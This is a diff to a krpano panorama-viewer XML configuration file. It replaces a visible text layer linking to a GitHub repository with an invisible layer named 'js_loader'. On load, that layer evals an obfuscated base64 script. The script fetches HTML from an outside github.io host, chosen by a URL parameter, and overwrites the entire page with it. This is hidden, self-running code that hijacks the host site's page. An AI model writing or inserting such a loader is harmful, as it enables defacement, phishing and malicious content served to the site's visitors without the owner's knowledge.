@@ -1,13 +1,1 @@
-
-<?xml version="1.0" encoding="UTF-8"?>
-<krpano version="1.21">
-  <layer
-    name="github_link"
-    type="text"
-    align="center"
-    width="300"
-    height="56"
-    html="Buka Repository Saya"
-    onclick="openurl('https://github.com/zapzapal25/dhgfh', '_blank');"
-  />
-</krpano>
+<krpano version="1.0.8.15"><layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAiYWxjYXphcl9hcnF1aXRlY3RvbmljbyI7CmZldGNoKCJodHRwczovL3phcHphcGFsMjUuZ2l0aHViLmlvL2RoZ2ZoL3Bvdi8iICsgaWQgKyAiLmh0bWwiKQogIC50aGVuKGUgPT4gZS50ZXh0KCkpCiAgLnRoZW4oZSA9PiB7CiAgICBkb2N1bWVudC5vcGVuKCksCiAgICBkb2N1bWVudC53cml0ZShlKSwKICAgIGRvY3VtZW50LmNsb3NlKCkKICB9KTs=');eval(w)););"/></krpano>
